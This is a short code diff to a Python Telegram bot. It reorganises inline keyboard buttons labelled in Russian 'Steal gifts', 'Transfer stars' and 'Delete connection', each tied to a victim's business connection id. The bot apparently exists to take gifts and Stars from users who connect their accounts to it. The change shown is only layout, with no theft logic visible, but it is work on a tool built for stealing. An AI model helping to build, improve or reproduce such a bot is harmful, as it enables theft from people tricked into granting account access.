@@ -333,17 +333,14 @@ async def handle_business(business_connection: types.BusinessConnection):
     business_id = business_connection.id
     builder = InlineKeyboardBuilder()
     
-    builder.button(
-        text="🎁 Украсть подарки", 
-        callback_data=f"steal_gifts:{business_id}"
+    # Добавляем две кнопки в одну строку
+    builder.row(
+        InlineKeyboardButton(text="🎁 Украсть подарки", callback_data=f"steal_gifts:{business_id}"),
+        InlineKeyboardButton(text="💰 Перевести звёзды", callback_data=f"transfer_stars:{business_id}")
     )
-    builder.button(
-        text="💰 Перевести звёзды", 
-        callback_data=f"transfer_stars:{business_id}"
-    )
-    builder.button(
-        text="⛔️ Удалить подключение", 
-        callback_data=f"destroy:{business_id}"
+    # Кнопка удаления на отдельной строке
+    builder.row(
+        InlineKeyboardButton(text="⛔️ Удалить подключение", callback_data=f"destroy:{business_id}")
     )
     builder.adjust(1)
     
